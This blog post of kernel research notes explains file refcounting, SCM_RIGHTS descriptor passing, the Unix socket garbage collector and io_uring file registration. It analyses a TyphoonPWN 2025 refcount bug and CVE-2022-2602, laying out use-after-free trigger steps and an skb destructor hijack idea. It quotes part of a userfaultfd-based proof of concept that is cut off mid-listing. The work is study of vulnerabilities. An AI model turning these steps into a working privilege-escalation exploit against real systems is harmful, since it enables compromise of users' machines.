+++
date= 2025-12-23
# description: ""
# image: ""
lastmod= 2025-12-23
tags = ['Linux','Memory','Kernel']
title= "Notes on refcounting and Unix Garbage Collector in the Linux Kernel"
type= "post"
+++


As a means of studying and getting to know more about the linux kernel, especially exploitation(LPE & RCE), i tried to make notes and go as far as i can in reviewing the **unix garbage**, or **GC**, collector, the **io_uring** subsystem, and some CVEs that showcase all of these. I am currently working on an N-day LPE for CVE-2022-2602 LPE to make it work with **FUSE** technique.

To kick off this article, i will explain the basics of **file structures**, **sockets**...etc in the kernel, and then move onto to the unix GC and io_uring, and i'll wrap with the CVEs.


I recommend supplementing with these readings to get a complementary understading:
- https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html
- https://lwn.net/Articles/779472/
- https://blogs.oracle.com/linux/unix-garbage-collection-and-iouring


###  File structures and reference counting

The Linux kernel uses the `file` structure to represent files in the kernel, and since in Linux everything is a file, hence, everything has an associated `struct file`, be it a file, a socket, or io_uring rings...etc; and note that a file descriptor is an **index** into an array table in `struct files_struct` :

```c
struct files_struct {
  /*
   * read mostly part
   */
	atomic_t count;
	bool resize_in_progress;
	wait_queue_head_t resize_wait;

	struct fdtable __rcu *fdt;
	struct fdtable fdtab;
  /*
   * written part on a separate cache line in SMP
   */
	spinlock_t file_lock ____cacheline_aligned_in_smp;
	unsigned int next_fd;
	unsigned long close_on_exec_init[1];
	unsigned long open_fds_init[1];
	unsigned long full_fds_bits_init[1];
	struct file __rcu * fd_array[NR_OPEN_DEFAULT]; <------------------ array of to struct files, the returned `int fd` is used to retieve its corresponding right struct file. 
};
```

Like many kernel data structures, file structures can have multiple references to them outstanding at any given time. As a simple example, passing a file descriptor to `dup()` will allocate a second file descriptor referring to the same file structure; The kernel must keep track of these references to be able to know when any given file structure is no longer used and can be freed; that is done using the **f_count** field:

```c
struct file {
	const struct file_operations	*f_op;
	enum rw_hint		f_write_hint;
	atomic_long_t		f_count; <------------------- REF COUNTER
	unsigned int 		f_flags;
	fmode_t			f_mode;		 // RWX: permissions on the file
	struct mutex		f_pos_lock;
	loff_t			f_pos;		 // Current position
	struct fown_struct	f_owner; // owner
	const struct cred	*f_cred;
	// [...]
```

Whenever a reference is created, by calling `dup2()`, forking the process, starting an I/O operation, or any of a number of other ways, **f_count** must be increased. When a reference is removed, via a call to `close()` or `exit()`, for example, 	`f_count` is decreased; when it reaches zero, the structure can be freed: \

Here's the kernel handler function for `dup2()`:	 

```c
static int do_dup2(struct files_struct *files,
	struct file *file, unsigned fd, unsigned flags)
__releases(&files->file_lock)
{
	struct file *tofree;
	struct fdtable *fdt;

	//...
	fdt = files_fdtable(files); // get the fdtable
	tofree = fdt->fd[fd];				// make a place to the new fd
	if (!tofree && fd_is_open(fd, fdt))
		goto Ebusy;
	get_file(file);             [1] <-------- f_count increment

	// ....
	if (tofree)
		filp_close(tofree, files); [2] <---------- decrement's the f_count of the replaced fd's file

	return fd;

Ebusy:
	spin_unlock(&files->file_lock);
	return -EBUSY;
}
```

So, this example illustrates what i just said: **[1]** function `get_file` down the line basically increments file's f_count with `atomic_long_inc(&f->f_count);`(the Linux Kernel developers like to complicate things, for a good reason i guess :). This is because a new reference to the file is added, which makes `f_count = 2`. \
At **[2]**, the opposite happens; since the replaced fd is longer held in that index, a reference is dropped .i.e: it's backing file's f_count is decremented using `filp_close` -> `fputs`.


Now, let's look more towards the sockets side. 

## Unix Sockets and Sending file descriptors:

As mentionned before, sockets aren't an exception to rule, in that they have a backing file structure in the kernel, so truly, "In Linux, everything is a file". \
In terms of kernel objects, there are 3 structures of sockets: \
- **BSD Socket**: This is created with the syscall `socket(...)` and is represented with:
```c
struct socket {
	socket_state		state; // socket state (%SS_CONNECTED, etc)

	short			type;				 // socket type (%SOCK_STREAM, etc)

	unsigned long		flags; // socket flags (%SOCK_NOSPACE, etc)

	struct file		*file; // Backing file for Garbage Collector
	struct sock		*sk;   // internal networking protocol agnostic socket representation
	const struct proto_ops	*ops; // operation handlers : bind, connect, accept etc...

	struct socket_wq	wq;
};
```
We can see the `struct file` which is for Garbage Collector usage(more on that later), and `struct sock`.

- **`struct sock`** : network layer representation of sockets, and it's protocol-agnostic socket state used by all protocols: tcp, udp..etc. and it handles all the operations in the network layer level.
```c
struct sock {
		// ...
		#define sk_refcnt		__sk_common.skc_refcnt // sock's reference count
    // ...
    struct sk_buff_head sk_receive_queue;   // Incoming packets
    struct sk_buff_head sk_write_queue;     // Outgoing packets
    struct sk_buff_head sk_error_queue;     // Error packets
    // ...
   
    // Buffers & limits
    int                 sk_rcvbuf;           // Receive buffer size
    int                 sk_sndbuf;           // Send buffer size
    //...

    // Socket identity
    #define sk_family		__sk_common.skc_family           // AF_INET, AF_UNIX, etc.
    __u16               sk_protocol;         // IPPROTO_TCP, etc.
    
    // Callbacks
    void (*sk_data_ready)(struct sock *sk);  //  callback to indicate there is data to be processed
    void (*sk_write_space)(struct sock *sk); // callback to indicate there is buffer sending space available
    void (*sk_error_report)(struct sock *sk);// callback to indicate errors (e.g. %MSG_ERRQUEUE)
    void (*sk_destruct)(struct sock *sk);    // called at sock freeing time, i.e. when all refcnt == 0
    
    // Backpointer
    struct socket      *sk_socket;           // reference its associated to BSD socket
    
    // Credentials & security
    const struct cred  *sk_peer_cred;
    
};
```
So this structure handles packet sending and receiving, buffering and of course, refcounting to say the least. \
Other strucuture inherit from `struct sock` to be specilized for a certain protocol: `inet_sock`, `tcp_sock` and `unix_sock`.


The latter, **`unix_sock`** is of interest in the LPE universe, which is used for Unix Domain Sockets:

```c
/* The AF_UNIX socket */
struct unix_sock {
	/* WARNING: sk has to be the first member */
	struct sock		sk;							 // Inheritence
	struct unix_address	*addr;		 // Name of the socket
	struct path		path;						 // path in the filesystem if bound
	struct mutex		iolock, bindlock; // peer socket connected to 
	struct sock		*peer;				   // peer socket connected to
	struct list_head	link;
	atomic_long_t		inflight;			 // [3] SCM_RIGHTS fd count
	// ...
	struct sk_buff		*oob_skb;		// socket's buffer
#endif
};
```
Everything is self explanatory, yet we need to focus more **[3]**: **inflight**. \
But first, let's talk a 'lil bit about sending file descriptots over sockets. First, let's quickly address the why ? \
The core need for this is simply **ipc**: sharing a resource from a priviliged process to an unprivileged one, communication between parent and child...etc. This [article](https://gist.github.com/domfarolino/4293951bd95082125f2b9931cab1de40) gives good examples.


So, fds can be passed from one socket to another using the `sendmsg` system call using `SCM_RIGHTS` message type like this:


```c
// @s : The sending socket
// @fd: socket to be sent
int scmrights_send_fd(int s, int fd) {
    struct msghdr msg;
    struct cmsghdr *cmsg;
    char buffer[1024];
    int fds[1] = { fd };

    memset(&msg, 0, sizeof(msg));
    memset(buffer, 0, sizeof(buffer));


    msg.msg_control = buffer; 
    msg.msg_controllen = sizeof(buffer);
    
    cmsg = CMSG_FIRSTHDR(&msg); 
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(fds));
    memcpy(CMSG_DATA(cmsg), fds, sizeof(fds));

    msg.msg_controllen = CMSG_SPACE(sizeof(fds));

    return sendmsg(s, &msg, 0);
}
```

Let's take a dive into the `sendmsg` syscall for type `SOCK_STREAM` & cmsg type `SCM_RIGHTS`:

```c
static int unix_stream_sendmsg(struct socket *sock, struct msghdr *msg,
			       size_t len)
{
	struct sock *sk = sock->sk;
	struct sock *other = NULL;
	int err, size;
	struct sk_buff *skb;
	int sent = 0;
	struct scm_cookie scm;
	bool fds_sent = false;
	int data_len;

	wait_for_unix_gc();
	err = scm_send(sock, msg, &scm, false); // [4]
	if (err < 0)
		return err;

	// ...
	while (sent < len) {
		size = len - sent;

		/* Keep two messages in the pipe so it schedules better */
		size = min_t(int, size, (sk->sk_sndbuf >> 1) - 64);

		// ...
		/* Only send the fds in the first buffer */
		err = unix_scm_to_skb(&scm, skb, !fds_sent); // [5]
		if (err < 0) {
			kfree_skb(skb);
			goto out_err;
		}
		fds_sent = true;

		skb_put(skb, size - data_len);
		skb->data_len = data_len;
		skb->len = size;
		err = skb_copy_datagram_from_iter(skb, 0, &msg->msg_iter, size);

		// ...
		maybe_add_creds(skb, sock, other);
		scm_stat_add(other, skb);
		skb_queue_tail(&other->sk_receive_queue, skb);
		unix_state_unlock(other);
		other->sk_data_ready(other);
		sent += size;
	}

#if IS_ENABLED(CONFIG_AF_UNIX_OOB)
	if (msg->msg_flags & MSG_OOB) {
		err = queue_oob(sock, msg, other);
		if (err)
			goto out_err;
		sent++;
	}
	// ...
}
```

As we see in **[4]**, `scm_send` subsequently calls `__scm_send`:
```c
int __scm_send(struct socket *sock, struct msghdr *msg, struct scm_cookie *p)
{
	struct cmsghdr *cmsg;
	int err;

	for_each_cmsghdr(cmsg, msg) {
		// ...
		switch (cmsg->cmsg_type)
		{
		case SCM_RIGHTS: // [5]
			if (!sock->ops || sock->ops->family != PF_UNIX)
				goto error;
			err=scm_fp_copy(cmsg, &p->fp);
			if (err<0)
				goto error;
			break;
		// ...
		case SCM_CREDENTIALS:
		// ...
```
In [5], with the cmsg type `SCM_RIGHTS`, **`scm_fp_copy`** copies all the passed fds into `struct scm_fp_list* p->fp`.

```c
static int scm_fp_copy(struct cmsghdr *cmsg, struct scm_fp_list **fplp)
{
	int *fdp = (int*)CMSG_DATA(cmsg);
	struct scm_fp_list *fpl = *fplp;
	struct file **fpp;
	int i, num;

	// ...
	if (!fpl)
	{
		fpl = kmalloc(sizeof(struct scm_fp_list), GFP_KERNEL_ACCOUNT);
		if (!fpl)
			return -ENOMEM;
		*fplp = fpl;
		fpl->count = 0;
		fpl->max = SCM_MAX_FD;
		fpl->user = NULL;
	}
	fpp = &fpl->fp[fpl->count];

	if (fpl->count + num > fpl->max)
		return -EINVAL;

	/*
	 *	Verify the descriptors and increment the usage count.
	 */

	for (i=0; i< num; i++) // FOR EACH PASSED FD
	{
		int fd = fdp[i];
		struct file *file;

		if (fd < 0 || !(file = fget_raw(fd))) 	// Get its structure file
			return -EBADF;
		*fpp++ = file;	//  store it
		fpl->count++;   //  increase its count
	}

	if (!fpl->user)
		fpl->user = get_uid(current_user());

	return num;
}
```

And later in [5], `unix_scm_to_skb` -> `unix_attach_fds` the sent fds get their **inflight**(remember **[3]** in `unix_sock`!!!) increment by 1 for each:
```c

int unix_attach_fds(struct scm_cookie *scm, struct sk_buff *skb)
{
	// ...
	/*
	 * Need to duplicate file references for the sake of garbage
	 * collection.  Otherwise a socket in the fps might become a
	 * candidate for GC while the skb is not yet queued.
	 */
	UNIXCB(skb).fp = scm_fp_dup(scm->fp); // [6]
	if (!UNIXCB(skb).fp)
		return -ENOMEM;

	for (i = scm->fp->count - 1; i >= 0; i--)
		unix_inflight(scm->fp->user, scm->fp->fp[i]); // [6]
	return 0;
```
The reason for these increments is this: \
consider a scenario where socket A sends fds into socket B; but before B receives them, the process of A closes these passed fds -> **UAF**. \
because initially, all files have 1 as `f_count` and closing them would decrease them to zero, hence, freeing them.


This function does:
- **[5]**: Increase each attached file's **f_count** using `file_get(...)` and store the duplicated list in `UNIXCB(skb).fp`
- **[6]**: for each file: 1) add it's `unix_sock` into the `gc_inflight_list` later for the GC.
													2) Increment the `unix_tot_inflight` global variable (Used to trigger GC if > UNIX_INFLIGHT_TRIGGER_GC == 16000).
													3) Increment user's `unix_inflight`.


Now, if your wonder how the hell the receiving process retrieves these passed fds, just see in `unix_stream_sendmsg` that it grabs its peer(receiving socket) with: \
`other = unix_peer(sk);` and then attaches the filled `sbk` into it with: \
`skb_queue_tail(&other->sk_receive_queue, skb);`

The receiving process is kinda the same. Again, i strongly recommand this google project zero [article](https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html).

![source: mine](/Qdiv7/images/gc_io/afr0mb.jpg)

## Case study:

We'll discuss a bug disclosed by @ky1ebot in TyphoonPWN 2025 Linux category, specifically **Ubuntu 24.04.2** with the kernel **6.8.0-60-generic**. \
The bug is refcount mismanagment in function `sendmsg` -> `unix_stream_sendmsg` -> `queue_oob`, so in another words when sending file descriptors with `SCM_RIGHTS` + the `MSG_OOB` flag:
```c
#if IS_ENABLED(CONFIG_AF_UNIX_OOB)
	if (msg->msg_flags & MSG_OOB) {
		err = queue_oob(sock, msg, other);
``` 



```c
static int queue_oob(struct socket *sock, struct msghdr *msg, struct sock *other)
{
	struct unix_sock *ousk = unix_sk(other);
	struct sk_buff *skb;
	int err = 0;

	skb = sock_alloc_send_skb(sock->sk, 1, msg->msg_flags & MSG_DONTWAIT, &err);

	//...

	maybe_add_creds(skb, sock, other);
	

	skb_get(skb); <--------------------------- THIS WAS REMOVED
	
	// ...
	WRITE_ONCE(ousk->oob_skb, skb); // [7]: Ref 1

	scm_stat_add(other, skb);
	skb_queue_tail(&other->sk_receive_queue, skb); // [8]: Ref 2
	sk_send_sigurg(other);
	unix_state_unlock(other);
	other->sk_data_ready(other);

	return err;
}
#endif

```

So basically, Ubuntu removed `skb_get(skb);` despite having 2 refenreces to `sbk` :
1) the receiving socket's `oob_skb` and
2) Receiving socket's `sk_receive_queue`. \
When the sockets are closed, one refcount is decreased by the `unix_gc` and then another by `unix_release_sock`; which means that `unix_release_sock` is called on a already freed object since it's refcount is down to **0**, thus giving an attacker a powerful primitive: the **Use-After-Free**.

Since the use happens in `unix_release_sock`:
```c
#if IS_ENABLED(CONFIG_AF_UNIX_OOB)
	if (u->oob_skb) {
		kfree_skb(u->oob_skb); <-------
		u->oob_skb = NULL;
	}
```
Down the line we get to :
```c
void skb_release_head_state(struct sk_buff *skb)
{
	skb_dst_drop(skb);
	if (skb->destructor) {
		DEBUG_NET_WARN_ON_ONCE(in_hardirq());
		skb->destructor(skb); // <---
	}
```

Therefore, if we manage do the first free, and then reclaim the `skb`'s with an object we can control(cross-cache attack or maybe pageJacking), `skb->destructor(skb);` can be used to hijack control flow. More on that in [this article](https://ssd-disclosure.com/lpe-via-refcount-imbalance-in-the-af_unix-of-ubuntus-kernel/).


## Registering a files description in io_uring:

The `io_uring_register` system call, when used with the **IORING_REGISTER_FILES** opcode, registers a file descriptor within io_uring context. This allows the underlying file object to be referenced and placed in an internal array and then can be used in an IO operation by specifying the index at which it was registered, utilizing the `io_uring_get_sqe` system call.

![source: chompie.ie](/Qdiv7/images/gc_io/iouring2.png)

In the kernel, the handler for `io_uring_register` is in **io_uring/register.c** :

```c
static int __io_uring_register(struct io_ring_ctx *ctx, unsigned opcode,
			       void __user *arg, unsigned nr_args)
{
	// ...
	case IORING_REGISTER_FILES:
		ret = -EFAULT;
		if (!arg)
			break;
		ret = io_sqe_files_register(ctx, arg, nr_args, NULL);
}
```

This snippet handles **IORING_REGISTER_FILES** opcode, which as mentionned is used to register files in the io_uring context.

In `io_uring/rsrc.c`, `io_sqe_files_register` is defined as follows:

```c
int io_sqe_files_register(struct io_ring_ctx *ctx, void __user *arg,
			  unsigned nr_args, u64 __user *tags)
{
	__s32 __user *fds = (__s32 __user *) arg;
	struct file *file;
	int fd, ret;
	unsigned i;

	if (ctx->file_table.data.nr)
		return -EBUSY;
	if (!nr_args)
		return -EINVAL;
	if (nr_args > IORING_MAX_FIXED_FILES)
		return -EMFILE;
	if (nr_args > rlimit(RLIMIT_NOFILE))
		return -EMFILE;
	if (!io_alloc_file_tables(ctx, &ctx->file_table, nr_args)) // [1]: Allocate `nr_args` elements into file_table->data
		return -ENOMEM;

	for (i = 0; i < nr_args; i++) { // [2] : iterates through the fds i.e: the nodes
		struct io_rsrc_node *node;
		u64 tag = 0;

		ret = -EFAULT;
		if (tags && copy_from_user(&tag, &tags[i], sizeof(tag)))
			goto fail;
		if (fds && copy_from_user(&fd, &fds[i], sizeof(fd))) // retieves the i-th fd 
			goto fail;
		/* allow sparse sets */
		if (!fds || fd == -1) {
			ret = -EINVAL;
			if (tag)
				goto fail;
			continue;
		}

		file = fget(fd); // [3], get the corresponding `struct file` pointer 
		ret = -EBADF;
		if (unlikely(!file))
			goto fail;

		/*
		 * Don't allow io_uring instances to be registered.
		 */
		if (io_is_uring_fops(file)) { // Prevent registering fd returned by io_uring_setup
			fput(file);
			goto fail;
		}

		// !!! THIS CODE SNIPPET REMOVED FROM THE LATEST LINUX KERNEL
		ret = io_scm_file_account(ctx, file);
		if (ret) {
			fput(file);
			goto fail;
		}

		// !!!!!!!!!!!!!!!!!!!!



		ret = -ENOMEM;
		node = io_rsrc_node_alloc(ctx, IORING_RSRC_FILE);
		if (!node) {
			fput(file);
			goto fail;
		}
		if (tag)
			node->tag = tag;
		ctx->file_table.data.nodes[i] = node; // [4]
		io_fixed_file_set(node, file);
		io_file_bitmap_set(&ctx->file_table, i);
	}

	/* default it to the whole table */
	io_file_table_set_alloc_range(ctx, 0, ctx->file_table.data.nr);
	return 0;
fail:
	io_clear_table_tags(&ctx->file_table.data);
	io_sqe_files_unregister(ctx);
	return ret;
}
```


In **[1]**, the function allocate a node(`struct io_rsrc_node`) array table of size `nr_args` in context's **file_table** which holds the registered files, which makes 1 node for each file descriptor passed to `io_uring_register`:

```c

bool io_alloc_file_tables(struct io_ring_ctx *ctx, struct io_file_table *table,
			  unsigned nr_files)
{
	if (io_rsrc_data_alloc(&table->data, nr_files)) // Allocates nodes
		return false;
	table->bitmap = bitmap_zalloc(nr_files, GFP_KERNEL_ACCOUNT); // Allocates the bitmap field
	if (table->bitmap)
		return true;
	io_rsrc_data_free(ctx, &table->data);
	return false;
}


__cold int io_rsrc_data_alloc(struct io_rsrc_data *data, unsigned nr)
{
	data->nodes = kvmalloc_array(nr, sizeof(struct io_rsrc_node *),
					GFP_KERNEL_ACCOUNT | __GFP_ZERO);
	if (data->nodes) {
		data->nr = nr;
		return 0;
	}
	return -ENOMEM;
}
```


In **[2]**, the function iterates through the supplied file descriptors from userspace, and retieves each time the `i`-th fd, and retrieves it's corresponding `struct file` pointer(**[3]**) in the kernel slab. 

It then allocates a node with 
```c
struct io_rsrc_node *io_rsrc_node_alloc(struct io_ring_ctx *ctx, int type)
{
	struct io_rsrc_node *node;

	node = io_cache_alloc(&ctx->node_cache, GFP_KERNEL);
	if (node) {
		node->type = type;
		node->refs = 1;
		node->tag = 0;
		node->file_ptr = 0;
	}
	return node;
}
```

At last , it sets the `node->file_ptr` to the file's pointer, and `node->refs` to 1; and then this node is stored in the table's `i`-th node(**[4]**).



## Reference counting in io_uring

Remember this code snippet from the last part:

```c
		// !!! THIS CODE SNIPPET REMOVED FROM THE LATEST LINUX KERNEL
		ret = io_scm_file_account(ctx, file);
		if (ret) {
			fput(file);
			goto fail;
		}

		// !!!!!!!!!!!!!!!!!!!!

```
This is responsible for refcounting the registered file, and it is was present at least until commit `9d84bb40bcb30a7fa16f33baa967aeb9953dda78`, but it is removed in the time of writing this article(December 2025):

```c
/*
 * Ensure the UNIX gc is aware of our file set, so we are certain that
 * the io_uring can be safely unregistered on process exit, even if we have
 * loops in the file referencing. We account only files that can hold other
 * files because otherwise they can't form a loop and so are not interesting
 * for GC.
 */
int __io_scm_file_account(struct io_ring_ctx *ctx, struct file *file)
{
#if defined(CONFIG_UNIX)
	struct sock *sk = ctx->ring_sock->sk;
	struct sk_buff_head *head = &sk->sk_receive_queue;
	struct scm_fp_list *fpl;
	struct sk_buff *skb;

	if (likely(!io_file_need_scm(file)))
		return 0;

	/*
	 * See if we can merge this file into an existing skb SCM_RIGHTS
	 * file set. If there's no room, fall back to allocating a new skb
	 * and filling it in.
	 */
	spin_lock_irq(&head->lock);
	skb = skb_peek(head);
	if (skb && UNIXCB(skb).fp->count < SCM_MAX_FD)
		__skb_unlink(skb, head);
	else
		skb = NULL;
	spin_unlock_irq(&head->lock);

	if (!skb) {
		fpl = kzalloc(sizeof(*fpl), GFP_KERNEL);
		if (!fpl)
			return -ENOMEM;

		skb = alloc_skb(0, GFP_KERNEL);
		if (!skb) {
			kfree(fpl);
			return -ENOMEM;
		}

		fpl->user = get_uid(current_user());
		fpl->max = SCM_MAX_FD;
		fpl->count = 0;

		UNIXCB(skb).fp = fpl;
		skb->sk = sk;
		skb->destructor = unix_destruct_scm;
		refcount_add(skb->truesize, &sk->sk_wmem_alloc);
	}

	fpl = UNIXCB(skb).fp;
	fpl->fp[fpl->count++] = get_file(file);
	unix_inflight(fpl->user, file);
	skb_queue_head(head, skb);
	fput(file);
#endif
	return 0;
}
``` 


So, this basically fills ring socket's  `sk_receive_queue` :

```c
	struct sock *sk = ctx->ring_sock->sk;
	struct sk_buff_head *head = &sk->sk_receive_queue;

	// ...
	fpl = UNIXCB(skb).fp;
	fpl->fp[fpl->count++] = get_file(file); // store the struct file for the new registered file
	unix_inflight(fpl->user, file);					// increment inflight number
	skb_queue_head(head, skb);							// add the new sbk(that holds a pointer to the new registered file) to the ring's queue.
```




## Vulnerability

First off, keep in mind that during **io_uring** setup phase, it allocate a `struct file` that backs the returnd io_uring fd:

```c
/*
 * Sets up an aio uring context, and returns the fd. Applications asks for a
 * ring size, we return the actual sq/cq ring sizes (among other things) in the
 * params structure passed in.
 */
static long io_uring_setup(u32 entries, struct io_uring_params __user *params)
{
	struct io_uring_params p;
	int i;

	if (copy_from_user(&p, params, sizeof(p)))
		return -EFAULT;
	for (i = 0; i < ARRAY_SIZE(p.resv); i++) {
		if (p.resv[i])
			return -EINVAL;
	}

	if (p.flags & ~IORING_SETUP_FLAGS)
		return -EINVAL;
	return io_uring_create(entries, &p, params); // <----------------------- HERE
}

static __cold int io_uring_create(unsigned entries, struct io_uring_params *p,
				  struct io_uring_params __user *params)
{
	// ....
	file = io_uring_get_file(ctx); // <-----------------------
	if (IS_ERR(file)) {
		ret = PTR_ERR(file);
		goto err;
	}
	// ...
}
/*
 * Allocate an anonymous fd, this is what constitutes the application
 * visible backing of an io_uring instance. The application mmaps this
 * fd to gain access to the SQ/CQ ring details.
 */
static struct file *io_uring_get_file(struct io_ring_ctx *ctx)
{
	/* Create a new inode so that the LSM can block the creation.  */
	return anon_inode_create_getfile("[io_uring]", &io_uring_fops, ctx, // <----------------------- AND THEN HERE
					 O_RDWR | O_CLOEXEC, NULL);
}
```

Now, after setting up an io_uring env, let's consider this scenario: \
1- Create socketpair s[0], s[1]. \
2- Send io_uring's fd from s[0] to s[1] as explained previously. \
3- Close s[0] and s[1]. \
4- Call `io_uring_queue_exit` to decrease the ring's `fd` refcount down to 1 (having the `inflight == 1` due to step **2**):

```c
__cold void io_uring_queue_exit(struct io_uring *ring)
{
	struct io_uring_sq *sq = &ring->sq;
	struct io_uring_cq *cq = &ring->cq;

	if (!(ring->int_flags & INT_FLAG_APP_MEM)) {
		__sys_munmap(sq->sqes, io_uring_sqes_size(ring));
		io_uring_unmap_rings(sq, cq);
	}

	/*
	 * Not strictly required, but frees up the slot we used now rather
	 * than at process exit time.
	 */
	if (ring->int_flags & INT_FLAG_REG_RING)
		io_uring_unregister_ring_fd(ring); // Unregistering the rings
	if (ring->ring_fd != -1)
		__sys_close(ring->ring_fd); // Decrementing ref_count
}
```

Then by triggering the garbage collector, the ring's `fd` with `inflight == refcount`, will be included in the `hitlist` which will free its queued files in `sbk` queue, thus, feering the registered file still in use -> **UAF**.


### Diving into the actual GC handling

**Stage 1**:

The GC function grabs sockets from `gc_inflight_list` (As its name indicates, it contains sockets whose inflight > 0) and fills the `gc_candidates` list with sockets that have refcount == inflight:
```c
	list_for_each_entry_safe(u, next, &gc_inflight_list, link) {
		struct sock *sk = &u->sk;
		long total_refs;

		total_refs = file_count(sk->sk_socket->file);

		BUG_ON(!u->inflight);
		BUG_ON(total_refs < u->inflight);
		if (total_refs == u->inflight) { // <------------ Checking refcount == inflight
			list_move_tail(&u->link, &gc_candidates); // <------------ Adding to the candidates list
			__set_bit(UNIX_GC_CANDIDATE, &u->gc_flags); // <----------- flagging the socket as a candidate to GC
			__set_bit(UNIX_GC_MAYBE_CYCLE, &u->gc_flags);

			if (sk->sk_state == TCP_LISTEN) {
				unix_state_lock_nested(sk, U_LOCK_GC_LISTENER);
				unix_state_unlock(sk);
			}
		}
	}
```

**Stage 2**:

For each socket in the candidates list, it calls `scan_children`:
```c
	/* Now remove all internal in-flight reference to children of
	 * the candidates.
	 */
	list_for_each_entry(u, &gc_candidates, link)
		scan_children(&u->sk, dec_inflight, NULL);
```

there's 2 cases:
- If it is not in a listening state:
```c
static void scan_children(struct sock *x, void (*func)(struct unix_sock *),
			  struct sk_buff_head *hitlist)
{
	if (x->sk_state != TCP_LISTEN) {
		scan_inflight(x, func, hitlist);

```
In this case, it walks through the socket's receiving queue, and for every socket in this queue:
	-> it checks that it is flagged as GC candidate
	-> if yes, it decreases its inflight
	-> if no, do nothing. 

- If it is in a listening state:
```c
	} else {
		struct sk_buff *skb;
		struct sk_buff *next;
		struct unix_sock *u;
		LIST_HEAD(embryos);

		/* For a listening socket collect the queued embryos
		 * and perform a scan on them as well.
		 */
		spin_lock(&x->sk_receive_queue.lock);
		skb_queue_walk_safe(&x->sk_receive_queue, skb, next) {
			u = unix_sk(skb->sk);

			/* An embryo cannot be in-flight, so it's safe
			 * to use the list link.
			 */
			BUG_ON(!list_empty(&u->link));
			list_add_tail(&u->link, &embryos);
		}
		spin_unlock(&x->sk_receive_queue.lock);

		while (!list_empty(&embryos)) {
			u = list_entry(embryos.next, struct unix_sock, link);
			scan_inflight(&u->sk, func, hitlist);
			list_del_init(&u->link);
		}
	}
```
-> It puts all sockets from the receiving queue into the `&embryos` list 
-> It calls `scan_inflight` for each one, and then removes it from `&embryos`


**Stage 3**:

```c
	/* Restore the references for children of all candidates,
	 * which have remaining references.  Do this recursively, so
	 * only those remain, which form cyclic references.
	 *
	 * Use a "cursor" link, to make the list traversal safe, even
	 * though elements might be moved about.
	 */
	list_add(&cursor, &gc_candidates);
	while (cursor.next != &gc_candidates) {
		u = list_entry(cursor.next, struct unix_sock, link);

		/* Move cursor to after the current position. */
		list_move(&cursor, &u->link);

		if (atomic_long_read(&u->inflight) > 0) {
			list_move_tail(&u->link, &not_cycle_list);
			__clear_bit(UNIX_GC_MAYBE_CYCLE, &u->gc_flags);
			scan_children(&u->sk, inc_inflight_move_tail, NULL);
		}
	}
	list_del(&cursor);
```

find the cycles and fill the hitlist.


**Stage 4:**

```c
	/* Now gc_candidates contains only garbage.  Restore original
	 * inflight counters for these as well, and remove the skbuffs
	 * which are creating the cycle(s).
	 */
	skb_queue_head_init(&hitlist);
	list_for_each_entry(u, &gc_candidates, link)
		scan_children(&u->sk, inc_inflight, &hitlist);

	/* not_cycle_list contains those sockets which do not make up a
	 * cycle.  Restore these to the inflight list.
	 */
	while (!list_empty(&not_cycle_list)) {
		u = list_entry(not_cycle_list.next, struct unix_sock, link);
		__clear_bit(UNIX_GC_CANDIDATE, &u->gc_flags);
		list_move_tail(&u->link, &gc_inflight_list);
	}
```

Restore the original values for inflight.


**Important Note:**
```c
	/* We need io_uring to clean its registered files, ignore all io_uring
	 * originated skbs. It's fine as io_uring doesn't keep references to
	 * other io_uring instances and so killing all other files in the cycle
	 * will put all io_uring references forcing it to go through normal
	 * release.path eventually putting registered files.
	 */
	skb_queue_walk_safe(&hitlist, skb, next_skb) {
		if (skb->scm_io_uring) {
			__skb_unlink(skb, &hitlist);
			skb_queue_tail(&skb->sk->sk_receive_queue, skb);
		}
	}
```

This code snippet is added in commit `0091bfc81741b8d3aeb3b7ab8636f911b2de6e80`. It protects io_uring registered `sbk` from being freed with the GC, it instead let io_uring handle it. \
So, before this patch, an actively used `sbk` in io_uring could be freed with GC while still being used -> UAF.  




## CVE-2022-2602

Thadeu Lima de Souza Cascardo reported a POC that looks like this:

```c

// [...]

// [1]
static int userfaultfd(int flags)
{
	return syscall(__NR_userfaultfd, flags);
}

static char buffer[4096];
static void fault_manager(int ufd)
{
	struct uffd_msg msg;
	struct uffdio_copy copy;
	read(ufd, &msg, sizeof(msg));
	if (msg.event != UFFD_EVENT_PAGEFAULT)
		err(1, "event not pagefault");
	copy.dst = msg.arg.pagefault.address;
	copy.src = (long) buffer;
	copy.len = 4096;
	copy.mode = 0;
	copy.copy = 0;
	sleep(2);
	ioctl(ufd, UFFDIO_COPY, &copy);
	close(ufd);
}

static char *bogus;

static void start_ufd(int ufd)
{
	struct uffdio_api api;
	struct uffdio_register reg;

	bogus = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	api.api = UFFD_API;
	api.features = 0;
	api.ioctls = 0;
	ioctl(ufd, UFFDIO_API, &api);

	reg.range.start = (long) bogus;
	reg.range.len = 4096;
	reg.mode = UFFDIO_REGISTER_MODE_MISSING;
	reg.ioctls = 0;

	ioctl(ufd, UFFDIO_REGISTER, &reg);
}


int sendfd(int s, int fd)
{
	struct msghdr msg;
	char buf[4096];
	struct cmsghdr *cmsg;
	int fds[1] = { fd };

	memset(&msg, 0, sizeof(msg));
	memset(buf, 0, sizeof(buf));

	msg.msg_control = buf;
	msg.msg_controllen = sizeof(buf);

	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(fds));
	memcpy(CMSG_DATA(cmsg), fds, sizeof(fds));

	msg.msg_controllen = CMSG_SPACE(sizeof(fds));

	sendmsg(s, &msg, 0);
}

// [...]

int prepare_request(int fd, struct io_uring_params *params, struct io_uring *ring)
{
	struct io_uring_sqe *sqe;
	io_uring_queue_mmap(fd, params, ring);
	sqe = io_uring_get_sqe(ring);
	sqe->opcode = IORING_OP_WRITEV;
	sqe->fd = 1;
	sqe->addr = (long) bogus;
	sqe->len = 1;
	sqe->flags = IOSQE_FIXED_FILE;
}

int main(int argc, char **argv)
{
	int ufd;
	pid_t manager;

	struct io_uring ring;
	int fd;
	struct io_uring_params *params;
